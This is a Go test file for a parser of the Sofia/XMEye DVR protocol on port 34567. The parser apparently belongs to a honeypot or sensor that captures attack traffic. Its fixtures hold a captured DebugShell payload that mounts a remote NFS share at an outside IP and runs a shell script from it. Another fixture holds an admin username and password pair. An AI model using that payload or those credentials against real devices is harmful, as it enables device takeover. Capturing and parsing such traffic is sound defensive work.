package sofia

import (
	"bytes"
	"io"
	"testing"

	"github.com/stretchr/testify/require"
)

// Frames from Ochi event on tcp/34567 (src scrubbed): a bare Ret message
// followed by a PingDev/DebugShell command.
const (
	captureBare  = "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf1\x03\x26\x00\x00\x00" + `{"Ret":100,"SessionID":"0x00000000"}` + "\n\x00"
	shellBody    = `{"DebugShell":"\ncd /var;umount -f b;mkdir b;mount -o intr,nolock,tcp,exec 170.205.28.207:/srv/nfs/share b;sh b/d.sh","Name":"DebugShell","OprName":"PingDev","SessionID":"0x00000000"}` + "\n\x00"
	captureShell = "\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x1c\x04\xb9\x00\x00\x00" + shellBody
)

func TestParseHeader(t *testing.T) {
	h, err := ParseHeader([]byte(captureShell))
	require.NoError(t, err)
	require.Equal(t, Header{Head: 0xff, Sequence: 1, MsgID: 0x041c, DataLen: 185}, h)
	require.Len(t, shellBody, 185)

	_, err = ParseHeader([]byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n"))
	require.ErrorIs(t, err, ErrBadMagic)
	_, err = ParseHeader([]byte{0xff, 0})
	require.ErrorIs(t, err, io.ErrUnexpectedEOF)
}

func TestReadRequest(t *testing.T) {
	r := bytes.NewReader([]byte(captureBare + captureShell))

	req, raw, trunc, err := ReadRequest(r, 1024)
	require.NoError(t, err)
	require.False(t, trunc)
	require.Equal(t, captureBare, string(raw))
	require.Equal(t, "msg-1009", req.CommandName())

	req, raw, _, err = ReadRequest(r, 1024)
	require.NoError(t, err)
	require.Equal(t, captureShell, string(raw))
	require.Equal(t, "DebugShell", req.CommandName())
	require.Equal(t, "PingDev", req.OprName)

	_, raw, _, err = ReadRequest(r, 1024)
	require.ErrorIs(t, err, io.EOF)
	require.Empty(t, raw)
}

func TestReadRequestOprNameFallbackAndCredentials(t *testing.T) {
	body := `{"OprName":"PingDev","PassWord":"tlJwpbo6","UserName":"admin"}` + "\n\x00"
	frame := append(bytes.Repeat([]byte{0}, HeaderLen), body...)
	frame[0] = Magic
	frame[16] = byte(len(body))
	req, _, _, err := ReadRequest(bytes.NewReader(frame), 1024)
	require.NoError(t, err)
	require.Equal(t, "PingDev", req.CommandName())
	require.Equal(t, "admin", req.Username)
	require.Equal(t, "tlJwpbo6", req.Password)
}

func TestReadRequestPartialAndOversize(t *testing.T) {
	_, raw, _, err := ReadRequest(bytes.NewReader([]byte(captureShell)[:30]), 1024)
	require.ErrorIs(t, err, io.ErrUnexpectedEOF)
	require.Equal(t, []byte(captureShell)[:30], raw)

	_, raw, trunc, err := ReadRequest(bytes.NewReader([]byte(captureShell)), 16)
	require.ErrorIs(t, err, ErrBodyTooLarge)
	require.True(t, trunc)
	require.Len(t, raw, HeaderLen+16)

	_, raw, _, err = ReadRequest(bytes.NewReader([]byte("\x00\x01\x02")), 16)
	require.ErrorIs(t, err, io.ErrUnexpectedEOF)
	require.Len(t, raw, 3)
}

func TestBuildResponse(t *testing.T) {
	req, _, _, err := ReadRequest(bytes.NewReader([]byte(captureBare)), 1024)
	require.NoError(t, err)
	want := "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf2\x03\x26\x00\x00\x00" + `{"Ret":100,"SessionID":"0x00000000"}` + "\n\x00"
	require.Equal(t, want, string(BuildResponse(req)))

	req, _, _, err = ReadRequest(bytes.NewReader([]byte(captureShell)), 1024)
	require.NoError(t, err)
	resp := BuildResponse(req)
	h, err := ParseHeader(resp)
	require.NoError(t, err)
	require.Equal(t, uint16(0x041d), h.MsgID)
	require.Equal(t, uint32(1), h.Sequence)
	require.Equal(t, int(h.DataLen), len(resp)-HeaderLen)
	require.Contains(t, string(resp[HeaderLen:]), `"Name":"DebugShell"`)
	require.NotContains(t, string(resp), "nfs")
}

func TestBuildResponseLoginSession(t *testing.T) {
	frame := bytes.Repeat([]byte{0}, HeaderLen)
	frame[0] = Magic
	frame[14] = 0xe8 // 1000
	frame[15] = 0x03
	req, _, _, err := ReadRequest(bytes.NewReader(frame), 16)
	require.NoError(t, err)
	resp := BuildResponse(req)
	h, err := ParseHeader(resp)
	require.NoError(t, err)
	require.Equal(t, uint16(1001), h.MsgID)
	require.Equal(t, uint32(2), h.SessionID)
	require.Contains(t, string(resp), `"SessionID":"0x00000002"`)
}
